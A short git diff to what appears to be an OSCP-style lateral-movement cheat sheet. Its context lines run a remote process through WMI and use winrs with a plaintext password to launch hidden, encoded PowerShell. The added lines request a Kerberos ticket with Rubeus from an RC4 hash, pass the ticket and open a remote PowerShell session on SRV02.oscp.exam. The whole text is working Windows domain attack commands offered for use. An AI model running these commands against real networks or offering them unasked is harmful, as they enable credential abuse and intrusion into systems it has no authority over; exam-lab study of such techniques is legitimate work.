@@ -699,6 +699,13 @@ Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Creat
 
 # winrs 
 winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e "
+
+
+# restrict ticket on host RDP
+.\Rubeus.exe asktgt /user:leonvqz /rc4:32323DS033D176ABAAF6BEAA0AA681400 /nowrap
+.\Rubeus.exe createnetonly /program:powershell.exe /show
+.\Rubeus.exe ptt /ticket:
+Enter-PSSession SRV02.oscp.exam -Authentication Negotiate
 ```
 ## DCOM
 ```powershell
